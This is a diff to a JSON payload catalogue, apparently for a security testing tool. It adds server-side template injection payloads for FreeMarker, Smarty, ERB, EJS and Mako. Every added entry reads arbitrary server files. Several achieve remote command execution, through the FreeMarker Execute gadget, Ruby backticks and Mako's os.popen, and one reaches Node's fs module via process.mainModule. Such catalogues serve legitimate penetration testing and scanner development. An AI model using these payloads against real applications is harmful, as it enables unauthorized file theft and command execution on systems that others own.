@@ -287,6 +287,24 @@
       "notes": "Includes the file as a template; subject to FreeMarker loader restrictions."
     },
     {
+      "id": "ssti-freemarker-file-execute",
+      "name": "ssti-freemarker-file-execute",
+      "category": "ssti",
+      "engine": "freemarker",
+      "mode": "file-read",
+      "template": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat <<POAD_FILE>>\")}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "freemarker",
+        "rce"
+      ],
+      "notes": "Classic FreeMarker Execute gadget (RCE) used to cat the file."
+    },
+    {
       "id": "ssti-velocity-detect",
       "name": "Velocity arithmetic probe",
       "category": "ssti",
@@ -355,6 +373,23 @@
       "notes": "fetch returns file contents when SECURITY allows local file access."
     },
     {
+      "id": "ssti-smarty-file-include",
+      "name": "ssti-smarty-file-include",
+      "category": "ssti",
+      "engine": "smarty",
+      "mode": "file-read",
+      "template": "{include file='<<POAD_FILE>>'}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "smarty"
+      ],
+      "notes": "Smarty include renders the file; works when fetch is disabled."
+    },
+    {
       "id": "ssti-erb-detect",
       "name": "ERB arithmetic probe",
       "category": "ssti",
@@ -395,6 +430,41 @@
         "ruby"
       ],
       "notes": "Ruby ERB can read files directly if the context evaluates arbitrary Ruby."
+    },
+    {
+      "id": "ssti-erb-file-ioread",
+      "name": "ssti-erb-file-ioread",
+      "category": "ssti",
+      "engine": "erb",
+      "mode": "file-read",
+      "template": "<%= IO.read('<<POAD_FILE>>') %>",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "erb"
+      ],
+      "notes": "Ruby IO.read alternative to File.read."
+    },
+    {
+      "id": "ssti-erb-file-backtick",
+      "name": "ssti-erb-file-backtick",
+      "category": "ssti",
+      "engine": "erb",
+      "mode": "file-read",
+      "template": "<%= `cat <<POAD_FILE>>` %>",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "erb",
+        "rce"
+      ],
+      "notes": "Ruby backtick command exec (RCE) catting the file."
     },
     {
       "id": "ssti-ejs-detect",
@@ -440,6 +510,23 @@
       "notes": "Works only where require() is reachable from the template scope."
     },
     {
+      "id": "ssti-ejs-file-mainmodule",
+      "name": "ssti-ejs-file-mainmodule",
+      "category": "ssti",
+      "engine": "ejs",
+      "mode": "file-read",
+      "template": "<%= process.mainModule.require('fs').readFileSync('<<POAD_FILE>>') %>",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "ejs"
+      ],
+      "notes": "Reaches fs via process.mainModule when require is not in scope."
+    },
+    {
       "id": "ssti-mako-detect",
       "name": "Mako arithmetic probe",
       "category": "ssti",
@@ -468,6 +555,24 @@
         "python"
       ],
       "notes": "Mako evaluates arbitrary Python expressions inside ${...}."
+    },
+    {
+      "id": "ssti-mako-file-ospopen",
+      "name": "ssti-mako-file-ospopen",
+      "category": "ssti",
+      "engine": "mako",
+      "mode": "file-read",
+      "template": "<% import os %>${os.popen('cat <<POAD_FILE>>').read()}",
+      "required": [
+        "file"
+      ],
+      "version_dependent": true,
+      "tags": [
+        "file-read",
+        "mako",
+        "rce"
+      ],
+      "notes": "Mako python block + os.popen fallback when open() is blocked."
     },
     {
       "id": "ssti-django-detect-add",
